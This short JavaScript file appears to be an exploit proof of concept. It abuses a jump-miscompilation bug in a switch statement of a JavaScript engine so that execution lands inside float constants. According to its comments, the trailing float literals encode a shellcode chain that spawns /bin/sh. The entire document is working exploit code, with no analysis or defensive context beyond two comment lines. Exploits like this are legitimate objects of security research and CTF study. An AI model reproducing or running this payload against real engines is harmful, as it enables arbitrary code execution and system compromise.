// trigger incorrect jump bug - `default`'s `break` will jump into the middle of our float in `case 1`
// this then jumps to the middle of the floats at the end, which are a shellcode chain that pops /bin/sh
switch (2) {
    case 1:
        0xaa; 0xbb; 0xcc;
        5.896445725132126e-306;
        0xdd; 0xee; "pad"; "pad";
        break;
    default:
        "pad"; typeof([0xff]);
        break;
}
9.62296256790703e-309;
9.62062829515093e-309;
9.62367803710164e-309;
9.62368259228255e-309;
9.62469800576726e-309;
9.62369571818025e-309;
9.62367573076072e-309;
1;
1;
